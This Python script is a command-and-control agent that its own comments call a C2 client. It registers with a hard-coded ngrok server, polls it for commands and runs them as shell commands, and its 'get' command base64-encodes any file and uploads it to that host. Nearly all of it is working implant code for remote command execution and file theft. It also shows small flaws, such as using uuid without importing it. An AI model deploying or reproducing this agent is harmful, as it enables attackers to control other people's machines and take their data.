import os, time, base64, subprocess, requests
from dotenv import load_dotenv

load_dotenv()
SERVER = 'https://selected-literally-teal.ngrok-free.app'
TOKEN  = os.environ['AGENT_TOKEN']

ID_FILE = os.environ.get('AGENT_ID_FILE', 'agent_id.txt')

# Persistent, unique agent ID
if os.path.exists(ID_FILE):
    with open(ID_FILE, 'r') as f:
        AGENT_ID = f.read().strip()
else:
    AGENT_ID = uuid.uuid4().hex
    with open(ID_FILE, 'w') as f:
        f.write(AGENT_ID)


def register():
    """Register this agent with the C2 server."""
    try:
        resp = requests.post(
            f"{SERVER}/agent/register",
            headers={'X-Agent-Token': TOKEN},
            json={'agent_id': AGENT_ID},
            timeout=5
        )
        if resp.status_code != 200:
            print(f"[register] bad status {resp.status_code}: {resp.text.strip()}")
    except Exception as e:
        print(f"[register] network error: {e}")


def notify_online():
    """Notify Slack that this agent is online."""
    webhook = os.environ.get('SLACK_WEBHOOK_AGENT_ONLINE')
    print(f"[notify_online] webhook={webhook!r}")     # ← debug
    if not webhook:
        print("[notify_online] no SLACK_WEBHOOK_AGENT_ONLINE defined, skipping")
        return

    text = f":white_check_mark: Agent `{AGENT_ID}` is now online"
    try:
        resp = requests.post(webhook, json={'text': text}, timeout=5)
        print(f"[notify_online] slack status={resp.status_code}")
        if resp.status_code != 200:
            print(f"[notify_online] slack error: {resp.text.strip()}")
    except Exception as e:
        print(f"[notify_online] network error: {e}")


def poll():
    """Poll the C2 server for the next command."""
    try:
        resp = requests.post(
            f"{SERVER}/agent/poll",
            headers={'X-Agent-Token': TOKEN},
            json={'agent_id': AGENT_ID},
            timeout=10
        )
    except requests.RequestException as e:
        print(f"[poll] network error: {e}")
        return None, None

    if resp.status_code != 200:
        print(f"[poll] bad status {resp.status_code}: {resp.text.strip()}")
        return None, None

    try:
        data = resp.json()
    except requests.exceptions.JSONDecodeError:
        print(f"[poll] invalid JSON response: {resp.text.strip()}")
        return None, None

    return data.get('cmd_id'), data.get('payload')


def report(cmd_id, exit_code, output):
    """Send the command result back to the C2 server."""
    try:
        resp = requests.post(
            f"{SERVER}/agent/report",
            headers={'X-Agent-Token': TOKEN},
            json={
                'cmd_id': cmd_id,
                'exit_code': exit_code,
                'output': output
            },
            timeout=10
        )
        if resp.status_code != 200:
            print(f"[report] bad status {resp.status_code}: {resp.text.strip()}")
    except Exception as e:
        print(f"[report] network error: {e}")


def main():
    """Main loop: poll for commands, execute, and report results."""
    interval = int(os.environ.get('POLL_INTERVAL', 30))
    while True:
        cmd_id, cmd = poll()
        if cmd_id:
            # Interactive shell mode
            if cmd.strip() == 'shell':
                while True:
                    line = input(f"{AGENT_ID}$ ")
                    if line in ('exit', 'quit'):
                        break
                    proc = subprocess.run(line, shell=True, capture_output=True, text=True)
                    report(cmd_id, proc.returncode, proc.stdout + proc.stderr)
            # File transfer (get)
            elif cmd.startswith('get '):
                path = cmd.split(' ', 1)[1]
                try:
                    with open(path, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    report(cmd_id, 0, f"FILE:{path}:{data}")
                except Exception as e:
                    report(cmd_id, 1, f"Error reading file: {e}")
            # Regular shell command
            else:
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                report(cmd_id, proc.returncode, proc.stdout + proc.stderr)
        time.sleep(interval)


if __name__ == '__main__':
    register()
    notify_online()
    main()
